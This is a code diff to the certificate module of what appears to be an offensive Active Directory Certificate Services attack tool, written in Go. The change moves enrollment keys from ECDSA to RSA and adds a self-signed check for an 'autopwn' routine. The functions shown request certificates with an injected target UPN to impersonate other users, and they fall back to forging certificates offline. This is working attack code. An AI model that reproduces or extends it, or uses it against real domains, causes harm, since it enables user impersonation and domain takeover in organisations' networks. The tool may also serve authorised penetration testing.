@@ -1,9 +1,9 @@
 package pki
 
 import (
-	"crypto/ecdsa"
-	"crypto/elliptic"
+	"crypto"
 	"crypto/rand"
+	"crypto/rsa"
 	"crypto/x509"
 	"crypto/x509/pkix"
 	"encoding/base64"
@@ -17,10 +17,11 @@ import (
 	"strings"
 )
 
+
 // GenerateCSR creates a PKCS#10 certificate signing request (DER-encoded) with
 // the target UPN encoded as an OtherName SAN extension. The Subject CN is
 // derived from the user portion of the UPN.
-func GenerateCSR(key *ecdsa.PrivateKey, upn string, templateName string) ([]byte, error) {
+func GenerateCSR(key crypto.Signer, upn string, templateName string) ([]byte, error) {
 	// Extract CN from UPN (user@domain -> user)
 	cn := upn
 	if at := strings.Index(upn, "@"); at > 0 {
@@ -66,9 +67,9 @@ func GenerateCSR(key *ecdsa.PrivateKey, upn string, templateName string) ([]byte
 //
 // Falls back to ForgeCertificate() (self-signed, offline mode) if web
 // enrollment is unreachable, with a clear warning.
-func EnrollCertificate(cfg *ADCSConfig, templateName, targetUPN string, sanInject bool) (*x509.Certificate, *ecdsa.PrivateKey, error) {
-	fmt.Printf("[*] Generating ECDSA P256 key pair for enrollment...\n")
-	certKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+func EnrollCertificate(cfg *ADCSConfig, templateName, targetUPN string, sanInject bool) (*x509.Certificate, crypto.Signer, error) {
+	fmt.Printf("[*] Generating RSA 2048 key pair for enrollment...\n")
+	certKey, err := rsa.GenerateKey(rand.Reader, 2048)
 	if err != nil {
 		return nil, nil, fmt.Errorf("generate key pair: %w", err)
 	}
@@ -146,13 +147,19 @@ func EnrollCertificate(cfg *ADCSConfig, templateName, targetUPN string, sanInjec
 // forgeFallback wraps ForgeCertificate for the offline fallback path. The
 // returned certificate is self-signed and will not authenticate against a real
 // domain controller.
-func forgeFallback(key *ecdsa.PrivateKey, upn string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
+func forgeFallback(key crypto.Signer, upn string) (*x509.Certificate, crypto.Signer, error) {
 	cert, certKey, err := ForgeCertificate(key, upn)
 	if err != nil {
 		return nil, nil, fmt.Errorf("offline forge fallback: %w", err)
 	}
 	fmt.Printf("[!] OFFLINE MODE: Certificate is self-signed — use only for testing/golden cert scenarios\n")
 	return cert, certKey, nil
+}
+
+// IsSelfSigned returns true if the certificate is self-signed (issuer == subject).
+// Used by autopwn to detect offline fallback certs that won't work against real AD.
+func IsSelfSigned(cert *x509.Certificate) bool {
+	return cert.Issuer.CommonName == cert.Subject.CommonName
 }
 
 // newNTLMClient creates an *http.Client with NTLMv2 transport authentication.
